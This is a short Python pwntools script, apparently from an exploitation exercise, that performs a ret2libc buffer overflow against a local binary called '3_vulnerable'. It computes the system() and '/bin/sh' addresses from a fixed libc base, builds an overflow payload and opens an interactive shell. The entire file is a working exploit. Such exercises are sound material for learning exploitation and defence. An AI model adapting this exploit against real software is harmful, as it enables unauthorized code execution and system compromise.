#!/usr/bin/python

from pwn import *

base = 0xf7e05000 # can search in peda vmmap
#system = 0x3ada0
#binsh = 0x15ba0b
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
system_off = base + libc.symbols['system']
binsh = base + next(libc.search('/bin/sh\x00'))

def main():
    # Start the process
    p = process("build/3_vulnerable")

    # Print the pid
    print p32(system_off)
    raw_input(str(p.proc.pid))

    # Craft the payload
    payload = "A"*76
    payload += p32(system_off)
    payload += p32(0xdeadc0de)
    payload += p32(binsh)
    payload = payload.ljust(96, "\x00")

    # Send the payload
    p.send(payload)

    # Pass interaction to the user
    p.interactive()

if __name__ == "__main__":
    main()
